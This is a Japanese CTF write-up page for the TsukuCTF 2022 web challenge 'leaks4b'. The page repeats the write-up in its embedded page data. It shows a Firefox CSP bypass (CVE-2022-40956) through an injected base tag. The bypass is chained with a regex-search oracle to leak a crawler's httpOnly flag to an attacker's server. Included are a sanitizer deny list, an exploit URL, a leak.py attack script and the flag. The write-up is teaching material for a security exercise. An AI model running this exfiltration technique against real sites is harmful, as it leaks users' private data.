<pre><div node="[object Object]" class="MarkdownRender_code__r6Sqc" style="color:#ccc;background:#2d2d2d;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:1em;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;word-wrap:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none;padding:1em;margin:.5em 0;overflow:auto"><code class="language-txt" style="color:#ccc;background:none;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:1em;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;word-wrap:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none"><span>http://133.130.96.134:31416/?cake=.suku...22.|%3Cbase%20href=//[自身のサーバ]%3E</span></code></div></pre>
<p>base タグは<code class="undefined MarkdownRender_inlineCode__5ZUcq" node="[object Object]">|</code>で設定し、特殊文字と小文字化に注意する(フラグの<code class="undefined MarkdownRender_inlineCode__5ZUcq" node="[object Object]">{</code>などは<code class="undefined MarkdownRender_inlineCode__5ZUcq" node="[object Object]">.</code>を利用して任意の一文字として埋めてやればよい)。<br/>
<!-- -->リークが行えることがわかったら、<code class="undefined MarkdownRender_inlineCode__5ZUcq" node="[object Object]">/static/img/flag0.jpg</code>が来るまで小文字すべてをクローラへ投げてやり、ヒットしたらフラグ文字列に追加し次の文字を探せばよい。<br/>
<!-- -->以下の leak.py で行う。</p>
<pre><div node="[object Object]" class="MarkdownRender_code__r6Sqc" style="color:#ccc;background:#2d2d2d;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:1em;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;word-wrap:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none;padding:1em;margin:.5em 0;overflow:auto"><code class="language-python" style="color:#ccc;background:none;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:1em;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;word-wrap:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none"><span class="token token" style="color:#cc99cd">import</span><span> requests
</span>
<span>TARGET_URL </span><span class="token token" style="color:#67cdcc">=</span><span> </span><span class="token token" style="color:#7ec699">&quot;http://133.130.96.134:31416&quot;</span><span>
</span><span>LEAK_URL </span><span class="token token" style="color:#67cdcc">=</span><span> </span><span class="token token" style="color:#7ec699">&quot;http://[自身のサーバ]&quot;</span><span class="token token" style="color:#ccc">.</span><span>replace</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#7ec699">&quot;http:&quot;</span><span class="token token" style="color:#ccc">,</span><span> </span><span class="token token" style="color:#7ec699">&quot;&quot;</span><span class="token token" style="color:#ccc">)</span><span class="token token" style="color:#ccc">.</span><span>replace</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#7ec699">&quot;https:&quot;</span><span class="token token" style="color:#ccc">,</span><span> </span><span class="token token" style="color:#7ec699">&quot;&quot;</span><span class="token token" style="color:#ccc">)</span><span>
</span>
<span>FLAG </span><span class="token token" style="color:#67cdcc">=</span><span> </span><span class="token token" style="color:#7ec699">&quot;.suku...22.&quot;</span><span>
</span>
<span></span><span class="token token" style="color:#cc99cd">for</span><span> c </span><span class="token token" style="color:#cc99cd">in</span><span> </span><span class="token token" style="color:#7ec699">&quot;abcdefghijklmnopqrstuvwxyz.&quot;</span><span class="token token" style="color:#ccc">:</span><span>
</span><span>    res </span><span class="token token" style="color:#67cdcc">=</span><span> requests</span><span class="token token" style="color:#ccc">.</span><span>post</span><span class="token token" style="color:#ccc">(</span><span class="token token string-interpolation" style="color:#7ec699">f&quot;</span><span class="token token string-interpolation interpolation" style="color:#ccc">{</span><span class="token token string-interpolation interpolation">TARGET_URL</span><span class="token token string-interpolation interpolation" style="color:#ccc">}</span><span class="token token string-interpolation" style="color:#7ec699">/order&quot;</span><span class="token token" style="color:#ccc">,</span><span> data</span><span class="token token" style="color:#67cdcc">=</span><span class="token token" style="color:#ccc">{</span><span class="token token" style="color:#7ec699">&quot;url&quot;</span><span class="token token" style="color:#ccc">:</span><span> </span><span class="token token string-interpolation" style="color:#7ec699">f&quot;</span><span class="token token string-interpolation interpolation" style="color:#ccc">{</span><span class="token token string-interpolation interpolation">TARGET_URL</span><span class="token token string-interpolation interpolation" style="color:#ccc">}</span><span class="token token string-interpolation" style="color:#7ec699">/?cake=</span><span class="token token string-interpolation interpolation" style="color:#ccc">{</span><span class="token token string-interpolation interpolation">FLAG</span><span class="token token string-interpolation interpolation" style="color:#ccc">}</span><span class="token token string-interpolation interpolation" style="color:#ccc">{</span><span class="token token string-interpolation interpolation">c</span><span class="token token string-interpolation interpolation" style="color:#ccc">}</span><span class="token token string-interpolation" style="color:#7ec699">|%3Cbase%20href=</span><span class="token token string-interpolation interpolation" style="color:#ccc">{</span><span class="token token string-interpolation interpolation">LEAK_URL</span><span class="token token string-interpolation interpolation" style="color:#ccc">}</span><span class="token token string-interpolation" style="color:#7ec699">%3E&quot;</span><span class="token token" style="color:#ccc">}</span><span class="token token" style="color:#ccc">)</span><span>
</span><span>    </span><span class="token token" style="color:#cc99cd">print</span><span class="token token" style="color:#ccc">(</span><span>res</span><span class="token token" style="color:#ccc">.</span><span>text</span><span class="token token" style="color:#ccc">)</span></code></div></pre>
<p>実行し、手動でリークした文字を追加していくと flag が得られた(自動化もできるが手動でも可能なような flag になっている)。</p>
<h2>TsukuCTF22{cakeuma}</h2></div><div class="Footer_footer__WOAaR">© 2021-<!-- -->2022<!-- --> SecHack365-Fans All Right Reserved.</div></div></div><script id="__NEXT_DATA__" type="application/json">{"props":{"pageProps":{"postData":{"id":"leaks4b","contentHtml":"# leaks4b\n\n## 問題文\n\nケーキをあいまい検索できます。 どれを注文するか迷ってしまいます！！\\\n`※フラグの形式はTsukuCTF22{[a-z]{7}}です。多数のリクエストを許容する問題ですが、数秒間隔をあけてください。配布されているソースは厳密なものではありません。フラグの提出回数は3回までとなっています。`\\\n[http://133.130.96.134:31416](http://133.130.96.134:31416/)\n\n## 難易度\n\n**hard**\n\n## 作問にあたって\n\n趣味 CTF ということもあり、キモイ問題を出しても良いでしょうということで 1day 問を出しました。\\\nMozilla に早めに報告してしまったので、0day 問ではなくなってしまいました(CVE-2022-40956)。\\\nCSSi や ReDoS を用いたリークなど非想定解が思い浮かびまくり、修正しました。\\\nもし、Firefox の 1day 以外で解かれた方がいましたら Writeup などで教えてくれると嬉しいです。\\\nちなみに Misc の soder はこの非想定解から生まれた問題です。\\\nそして 4b は嘘です。\n\n## 解法\n\nURL とソースが渡される。\\\nアクセスするとケーキを検索できるページのようだ。\\\n![site1.png](images/site1.png)\\\nクローラが設置されており、パティシエが閲覧してくれるようだ。\\\n![site2.png](images/site2.png)\\\nひとまず配布されたソースの app.py を見ると、以下のようであった。\n\n```python\n~~~\ndef cssi_sanitizer(text):\n    # XSS could be mitigated by CSP, but CSSi and ReDoS are dangerous.\n    deny_list = [\"stylesheet\", \"import\", \"image\", \"style\", \"flag\", \"link\", \"img\", \"\\\"\", \"$\", \"'\", \"(\", \")\", \"*\", \"+\", \":\", \";\", \"?\", \"@\", \"[\", \"\\\\\", \"]\", \"^\", \"{\", \"}\"]\n    text = text.lower()\n    if any([hack in text for hack in deny_list]):\n        return \"ハッキングケーキ\"\n    return text\n\nmenu = [\"チョコレートケーキ, チョコケーキ, chocolatecake\", \"チーズケーキ, cheesecake\", \"バナナケーキ, bananacake\"]\n\n~~~\n@app.route(\"/\")\ndef top():\n    cake = request.args.get(\"cake\", \"チョコレートケーキ\")\n    cake = cssi_sanitizer(cake[:100])\n    flag = request.cookies.get(\"flag\")\n    # It is not expected to steal the cookie.\n    # This is \"leaks4b.\"\n    if (flag == FLAG) and (re.findall(cake, FLAG)):\n        img = \"flag0.jpg\"\n    elif re.findall(cake, menu[0]):\n        img = f\"cake0.jpg\"\n    elif re.findall(cake, menu[1]):\n        img = f\"cake1.jpg\"\n    elif re.findall(cake, menu[2]):\n        img = f\"cake2.jpg\"\n    else:\n        img = f\"cake3.jpg\"\n    nonce = secrets.token_urlsafe(16)\n    return f\"\"\"\u003c!doctype html\u003e\n\u003chtml\u003e\n\u003chead\u003e\n    \u003cmeta charset=\"UTF-8\"\u003e\n    \u003cmeta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\"\u003e\n    \u003cmeta http-equiv=\"Content-Security-Policy\" content=\"script-src 'nonce-{nonce}'; base-uri 'none'; connect-src 'none'; font-src 'none'; form-action 'none'; frame-src 'none'; object-src 'none'; require-trusted-types-for 'script'; worker-src 'none';\"\u003e\n    \u003cscript src=\"https://cdn.tailwindcss.com\" nonce=\"{nonce}\"\u003e\u003c/script\u003e\n    \u003ctitle\u003eLeaks4b\u003c/title\u003e\n\u003c/head\u003e\n~~~\n\"\"\"\n\n~~~\n@app.route(\"/order\", methods=[\"POST\"])\ndef order_post():\n    url = request.form.get(\"url\", \"____\")\n    if not url.startswith(\"http\"):\n        return \"[ERROR] http and https schemes are allowed.\"\n    try:\n        with sync_playwright() as p:\n            browser = p.firefox.launch()\n            context = browser.new_context()\n            context.add_cookies([{\"name\": \"flag\", \"value\": FLAG, \"httpOnly\": True, \"url\": URL}])\n            page = context.new_page()\n            page.goto(url, timeout=10000)\n            browser.close()\n    except Exception as e:\n        print(e)\n        pass\n    return \"I received your cake order. Have the flag and wait for your cake!\"\n~~~\n```\n\n`?cake=`に入力した文字を正規表現としてケーキを検索している。\\\nフラグも検索できるが、cookie がフラグ文字列と一致している場合にのみ検索可能なようで、クローラ以外には不可能と考えられる。\\\nフラグが検索できた場合に表示される画像は`flag0.jpg`であり、ケーキは`cake0~3.jpg`である。\\\nこの画像にフラグが書かれているのではと予測し、アクセスするが以下の画像が表示されるだけであった。\\\n![flag0.jpg](images/flag0.jpg)\\\n一見すると`?cake=`で任意の HTML タグを差し込め、XSS によってクローラの cookie を取得できそうだが httpOnly であるようだ。\\\nさらに cssi\\_sanitizer と、とんでもなく厳しい CSP により守られており、XSS は愚か CSSi も難しい。\\\n何とかしてクローラのフラグ検索結果の成否をリークしたい。\\\nここでユーザ由来の正規表現を使っているため、ReDoS の可能性もあることに気づく。\\\n幸い CSP に img の制限はないため、自身のドメインを src に設定した img タグを挿入し、アクセスの有無を確認することで ReDoS の応答遅延によってフラグをリークする手法が思い浮かぶ。\\\nしかし cssi\\_sanitizer や文字数制限が邪魔をして、これも難しい。\\\nここで試しによくある手法である base タグを挿入すると、CSP で none であるはずなのになぜか img の src を base の href へ問い合わせることがわかる。\\\nこれによって、CSP をバイパスして img の相対パスがリークできる。\\\nimg の画像ファイル名は検索結果によって異なるためクローラのフラグ検索結果のオラクルになりえる。\\\nあとはフラグに一致する正規表現と base タグを cssi\\_sanitizer を躱してクエリに設定してやればよい。\\\nフラグの`TsukuCTF22{`リークするクエリは以下になる。\n\n```txt\nhttp://133.130.96.134:31416/?cake=.suku...22.|%3Cbase%20href=//[自身のサーバ]%3E\n```\n\nbase タグは`|`で設定し、特殊文字と小文字化に注意する(フラグの`{`などは`.`を利用して任意の一文字として埋めてやればよい)。\\\nリークが行えることがわかったら、`/static/img/flag0.jpg`が来るまで小文字すべてをクローラへ投げてやり、ヒットしたらフラグ文字列に追加し次の文字を探せばよい。\\\n以下の leak.py で行う。\n\n```python\nimport requests\n\nTARGET_URL = \"http://133.130.96.134:31416\"\nLEAK_URL = \"http://[自身のサーバ]\".replace(\"http:\", \"\").replace(\"https:\", \"\")\n\nFLAG = \".suku...22.\"\n\nfor c in \"abcdefghijklmnopqrstuvwxyz.\":\n    res = requests.post(f\"{TARGET_URL}/order\", data={\"url\": f\"{TARGET_URL}/?cake={FLAG}{c}|%3Cbase%20href={LEAK_URL}%3E\"})\n    print(res.text)\n```\n\n実行し、手動でリークした文字を追加していくと flag が得られた(自動化もできるが手動でも可能なような flag になっている)。\n\n## TsukuCTF22{cakeuma}\n","title":"leaks4b","description":"Firefoxの1day問題","author":"Satoki","genre":"Web","solver":3,"point":500}},"__N_SSG":true},"page":"/ctf/TsukuCTF2022/[id]","query":{"id":"leaks4b"},"buildId":"E8Mu5MlMTR0xFKIeOx1KX","isFallback":false,"gsp":true,"scriptLoader":[]}</script></body></html>